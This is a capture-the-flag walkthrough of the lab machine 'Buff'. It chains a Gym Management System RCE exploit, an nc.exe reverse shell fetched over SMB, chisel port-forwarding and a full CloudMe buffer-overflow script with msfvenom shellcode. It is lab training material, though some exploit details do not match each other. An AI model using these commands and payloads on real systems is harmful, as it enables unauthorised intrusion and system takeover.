![Buff.PNG](/assets/Machines/Easy/Buff/Buff.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.198
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.198
```

**Output**
```bash
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

3. Visit Web Page

![web.PNG](/assets/Machines/Easy/Buff/web.PNG)

4. If you visit `About` section you can found the version of the system management.

![about.PNG](/assets/Machines/Easy/Buff/about.PNG)

5. Search of any exploit with this system management.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]                                                                          
└─# searchsploit Gym  1.0
-------------------------------------------------------------------------------------- -----------------------
 Exploit Title                                                                        |  Path                           
-------------------------------------------------------------------------------------- -----------------------
Gym Management System 1.0 - 'id' SQL Injection                                        | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                     | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                               | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                     | php/webapps/48506.py
-------------------------------------------------------------------------------------- -----------------------
```

6. Use this `php/webapps/48506.py`.
7. Run exploit
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]
└─# python2 gym_exploit.py 'http://<Machine's IP>:<Port Running Service>/'
```
**Output**
```
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG

buff\shaun
```


8. Get a reverse shell.

* First, download [nc.exe](https://eternallybored.org/misc/netcat/).
* Then, create a smbserver to share nc.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]
└─# impacket-smbserver shareFolder $(pwd) -smb2support
```
* Next, listen on port.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]
└─# rlwrap nc -lvnp 4444
```
* Finally, access to previous resource:
```
C:\xampp\htdocs\gym\upload> \\10.10.14.33\shareFolder\nc.exe -e cmd 10.10.14.33 4444
```
**Output**
```
C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
```

9. Show **user flag**
```
C:\Users\shaun\Desktop>type user.txt
23aa9705dfe34dca922d205de24794f1
```

---
---
### **Privileges Escalation** 💀
1. Download [winPEAS](https://github.com/carlospolop/PEASS-ng/releases) in target machine.
2. When you run winPEAS you can look this.
```
TCP        127.0.0.1             8888          0.0.0.0               0               Listening         8864            CloudMe
```
3. If you search in Downloads directory in shaun.
```
C:\Users\shaun\Downloads>dir

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,739,269,120 bytes free
```

4. Search for CloudMe exploit.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]
└─# searchsploit cloudme                 
---------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                       |  Path
---------------------------------------------------------------------------------------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                               | windows/remote/48389.py
```

5. Do `Port Forwarding`, use [chisel](https://github.com/jpillora/chisel)

* First, install chisel.exe in target machine
* Then, use chisel in our machine
```
┌──(root㉿kali)-[/home/…/Machines/Easy/Buff/chisel]
└─# ./chisel server -p 9999 --reverse
```
* Connect how client in target machine
```
C:\Windows\Temp\Process>chisel.exe client 10.10.14.33:9999 R:8888:127.0.0.1:8888
```

6. Now in our machine is run CloudMe in port 8888
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]
└─# lsof -i:8888
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
chisel  262005 root    8u  IPv6 761383      0t0  TCP *:8888 (LISTEN)
```

7. Use msfvenom to create a payload to put into python exploit.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Buff]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread 
```

8. Put previous output in CloudMe python exploit.
```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload = (
b"\xbf\x06\x64\x83\x1a\xdb\xce\xd9\x74\x24\xf4\x5e"
b"\x2b\xc9\xb1\x52\x83\xc6\x04\x31\x7e\x0e\x03\x78"
b"\x6a\x61\xef\x78\x9a\xe7\x10\x80\x5b\x88\x99\x65"
b"\x6a\x88\xfe\xee\xdd\x38\x74\xa2\xd1\xb3\xd8\x56"
b"\x61\xb1\xf4\x59\xc2\x7c\x23\x54\xd3\x2d\x17\xf7"
b"\x57\x2c\x44\xd7\x66\xff\x99\x16\xae\xe2\x50\x4a"
b"\x67\x68\xc6\x7a\x0c\x24\xdb\xf1\x5e\xa8\x5b\xe6"
b"\x17\xcb\x4a\xb9\x2c\x92\x4c\x38\xe0\xae\xc4\x22"
b"\xe5\x8b\x9f\xd9\xdd\x60\x1e\x0b\x2c\x88\x8d\x72"
b"\x80\x7b\xcf\xb3\x27\x64\xba\xcd\x5b\x19\xbd\x0a"
b"\x21\xc5\x48\x88\x81\x8e\xeb\x74\x33\x42\x6d\xff"
b"\x3f\x2f\xf9\xa7\x23\xae\x2e\xdc\x58\x3b\xd1\x32"
b"\xe9\x7f\xf6\x96\xb1\x24\x97\x8f\x1f\x8a\xa8\xcf"
b"\xff\x73\x0d\x84\x12\x67\x3c\xc7\x7a\x44\x0d\xf7"
b"\x7a\xc2\x06\x84\x48\x4d\xbd\x02\xe1\x06\x1b\xd5"
b"\x06\x3d\xdb\x49\xf9\xbe\x1c\x40\x3e\xea\x4c\xfa"
b"\x97\x93\x06\xfa\x18\x46\x88\xaa\xb6\x39\x69\x1a"
b"\x77\xea\x01\x70\x78\xd5\x32\x7b\x52\x7e\xd8\x86"
b"\x35\x8b\x17\x86\xe4\xe3\x25\x96\xe7\x48\xa0\x70"
b"\x8d\xbe\xe5\x2b\x3a\x26\xac\xa7\xdb\xa7\x7a\xc2"
b"\xdc\x2c\x89\x33\x92\xc4\xe4\x27\x43\x25\xb3\x15"
b"\xc2\x3a\x69\x31\x88\xa9\xf6\xc1\xc7\xd1\xa0\x96"
b"\x80\x24\xb9\x72\x3d\x1e\x13\x60\xbc\xc6\x5c\x20"
b"\x1b\x3b\x62\xa9\xee\x07\x40\xb9\x36\x87\xcc\xed"
b"\xe6\xde\x9a\x5b\x41\x89\x6c\x35\x1b\x66\x27\xd1"
b"\xda\x44\xf8\xa7\xe2\x80\x8e\x47\x52\x7d\xd7\x78"
b"\x5b\xe9\xdf\x01\x81\x89\x20\xd8\x01\xa9\xc2\xc8"
b"\x7f\x42\x5b\x99\x3d\x0f\x5c\x74\x01\x36\xdf\x7c"
b"\xfa\xcd\xff\xf5\xff\x8a\x47\xe6\x8d\x83\x2d\x08"
b"\x21\xa3\x67")

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)

```

9. Listen on chosed port on msfvenom payload.

**Output**
```
C:\Windows\system32>whoami
buff\administrator
```

10. Show **root flag**
```
C:\Windows\system32>type \Users\Administrator\Desktop\root.txt
b737cbaad2cb47070019b3442d6f9e08
```